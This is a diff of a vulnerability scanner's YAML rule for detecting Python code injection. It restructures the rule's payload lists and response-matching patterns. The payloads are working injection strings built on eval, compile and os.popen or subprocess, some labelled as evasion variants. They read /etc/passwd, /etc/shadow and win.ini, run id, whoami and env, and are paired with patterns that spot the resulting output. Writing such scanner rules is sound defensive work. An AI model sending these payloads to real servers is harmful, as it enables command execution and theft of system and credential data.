@@ -2,137 +2,38 @@ rule_name: Python Code Injection
 description: "Detects Python code injection vulnerabilities enabling arbitrary code execution on Linux and Windows servers."
 
 transform:
-  query:
+  all:
     transformations:
       - replace_all_values_one_by_one:
-          # ── Linux: /etc/passwd ──
           - "eval(compile(\"\"\"for x in range(1):\n import os\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
           - "__import__('os').popen('cat /etc/passwd').read()"
           - "str(\"-\"*50),__import__('os').popen('cat /etc/passwd').read()"
-          # ── Linux: id / whoami / uname ──
           - "__import__('os').popen('id').read()"
           - "eval(compile(\"\"\"__import__('os').popen(r'id').read()\"\"\",'','single'))"
           - "__import__('os').popen('whoami').read()"
           - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'uname -a').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/hostname').read()\"\"\",'','single'))"
-          # ── Linux: /etc/shadow (privilege check) ──
           - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/shadow').read()\"\"\",'','single'))"
-          # ── Linux: network / environment ──
           - "eval(compile(\"\"\"__import__('os').popen(r'ifconfig').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'env').read()\"\"\",'','single'))"
-          # ── Windows: win.ini ──
           - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\win.ini').read()\"\"\",'','single'))"
           - "__import__('os').popen('type C:\\\\Windows\\\\win.ini').read()"
           - "eval(compile(\"\"\"__import__('subprocess').check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
-          # ── Windows: hosts file ──
           - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\System32\\drivers\\etc\\hosts').read()\"\"\",'','single'))"
           - "__import__('os').popen('type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts').read()"
-          # ── Windows: whoami / systeminfo ──
           - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'systeminfo').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'ipconfig').read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').popen(r'set').read()\"\"\",'','single'))"
-          # ── Cross-platform: Python-native recon ──
           - "__import__('os').getcwd()"
           - "eval(compile(\"\"\"__import__('platform').node()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('platform').platform()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('socket').getfqdn()\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').listdir('/')\"\"\",'','single'))"
           - "eval(compile(\"\"\"__import__('os').listdir('C:\\\\')\"\"\",'','single'))"
-          # ── Evasion: loop + subprocess variants ──
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.Popen(r'cat /etc/passwd',shell=True, stdout=subprocess.PIPE).stdout.read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'whoami',shell=True)\"\"\",'','single'))"
-  body:
-    transformations:
-      - replace_all_values_one_by_one:
-          # ── Linux: /etc/passwd ──
-          - "eval(compile(\"\"\"for x in range(1):\n import os\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
-          - "__import__('os').popen('cat /etc/passwd').read()"
-          - "str(\"-\"*50),__import__('os').popen('cat /etc/passwd').read()"
-          # ── Linux: id / whoami / uname ──
-          - "__import__('os').popen('id').read()"
-          - "eval(compile(\"\"\"__import__('os').popen(r'id').read()\"\"\",'','single'))"
-          - "__import__('os').popen('whoami').read()"
-          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'uname -a').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/hostname').read()\"\"\",'','single'))"
-          # ── Linux: /etc/shadow (privilege check) ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/shadow').read()\"\"\",'','single'))"
-          # ── Linux: network / environment ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'ifconfig').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'env').read()\"\"\",'','single'))"
-          # ── Windows: win.ini ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\win.ini').read()\"\"\",'','single'))"
-          - "__import__('os').popen('type C:\\\\Windows\\\\win.ini').read()"
-          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
-          # ── Windows: hosts file ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\System32\\drivers\\etc\\hosts').read()\"\"\",'','single'))"
-          - "__import__('os').popen('type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts').read()"
-          # ── Windows: whoami / systeminfo ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'systeminfo').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'ipconfig').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'set').read()\"\"\",'','single'))"
-          # ── Cross-platform: Python-native recon ──
-          - "__import__('os').getcwd()"
-          - "eval(compile(\"\"\"__import__('platform').node()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('platform').platform()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('socket').getfqdn()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').listdir('/')\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').listdir('C:\\\\')\"\"\",'','single'))"
-          # ── Evasion: loop + subprocess variants ──
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.Popen(r'cat /etc/passwd',shell=True, stdout=subprocess.PIPE).stdout.read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
-          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'whoami',shell=True)\"\"\",'','single'))"
-  header:
-    transformations:
-      - replace_all_values_one_by_one:
-          # ── Linux: /etc/passwd ──
-          - "eval(compile(\"\"\"for x in range(1):\n import os\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
-          - "__import__('os').popen('cat /etc/passwd').read()"
-          - "str(\"-\"*50),__import__('os').popen('cat /etc/passwd').read()"
-          # ── Linux: id / whoami / uname ──
-          - "__import__('os').popen('id').read()"
-          - "eval(compile(\"\"\"__import__('os').popen(r'id').read()\"\"\",'','single'))"
-          - "__import__('os').popen('whoami').read()"
-          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'uname -a').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/hostname').read()\"\"\",'','single'))"
-          # ── Linux: /etc/shadow (privilege check) ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/shadow').read()\"\"\",'','single'))"
-          # ── Linux: network / environment ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'ifconfig').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'env').read()\"\"\",'','single'))"
-          # ── Windows: win.ini ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\win.ini').read()\"\"\",'','single'))"
-          - "__import__('os').popen('type C:\\\\Windows\\\\win.ini').read()"
-          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
-          # ── Windows: hosts file ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\System32\\drivers\\etc\\hosts').read()\"\"\",'','single'))"
-          - "__import__('os').popen('type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts').read()"
-          # ── Windows: whoami / systeminfo ──
-          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'systeminfo').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'ipconfig').read()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').popen(r'set').read()\"\"\",'','single'))"
-          # ── Cross-platform: Python-native recon ──
-          - "__import__('os').getcwd()"
-          - "eval(compile(\"\"\"__import__('platform').node()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('platform').platform()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('socket').getfqdn()\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').listdir('/')\"\"\",'','single'))"
-          - "eval(compile(\"\"\"__import__('os').listdir('C:\\\\')\"\"\",'','single'))"
-          # ── Evasion: loop + subprocess variants ──
           - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.Popen(r'cat /etc/passwd',shell=True, stdout=subprocess.PIPE).stdout.read()\"\"\",'','single'))"
           - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
           - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
@@ -141,27 +42,62 @@ transform:
 match_on:
   body:
     contains:
-      # Linux: /etc/passwd indicators
       - "root:x:0:0:"
-      - "root:\\*:0:0:"
-      - "daemon:x:"
-      - "nobody:x:"
-      # Linux: id command output
-      - "uid="
-      # Linux: uname output
-      - "GNU/Linux"
-      # Windows: win.ini indicators
-      - "\\[fonts\\]"
+      - value: 'root:\*:0:0:'
+        options:
+          regex: true
+      - "daemon:x:1:1:"
+      - "nobody:x:65534:"
+      - value: 'nobody:\*:65534:'
+        options:
+          regex: true
+      - "www-data:x:33:"
+      - ":/bin/bash"
+      - ":/bin/sh"
+      - ":/sbin/nologin"
+      - ":/usr/sbin/nologin"
+
+      - value: 'uid=0\(root\) gid=0\(root\)'
+        options:
+          regex: true
+      - value: 'uid=33\(www-data\) gid=33'
+        options:
+          regex: true
+      - value: 'uid=48\(apache\) gid=48'
+        options:
+          regex: true
+      - value: 'uid=1000\('
+        options:
+          regex: true
+      - value: '\) gid='
+        options:
+          regex: true
+
+      - "x86_64 GNU/Linux"
+      - "aarch64 GNU/Linux"
+      - " SMP "
+      - "Linux version "
+
       - "; for 16-bit app support"
-      - "\\[extensions\\]"
-      # Windows: hosts file indicator
-      - "# Copyright \\(c\\) 1993-"
-      # Windows: systeminfo output
-      - "OS Name:"
-      - "Microsoft Windows"
-      # Windows: ipconfig output
+      - value: '\[fonts\]'
+        options:
+          regex: true
+      - value: '\[extensions\]'
+        options:
+          regex: true
+
+      - value: '# Copyright \(c\) 1993-'
+        options:
+          regex: true
+
+      - "OS Name:                   Microsoft Windows"
+      - "OS Version:                "
+      - "System Type:               "
+
       - "Windows IP Configuration"
-      - "IPv4 Address"
+      - value: 'IPv4 Address\. \. \. \. \. \. \. \. \.'
+        options:
+          regex: true
 
 report:
   title: "Python Code Injection"
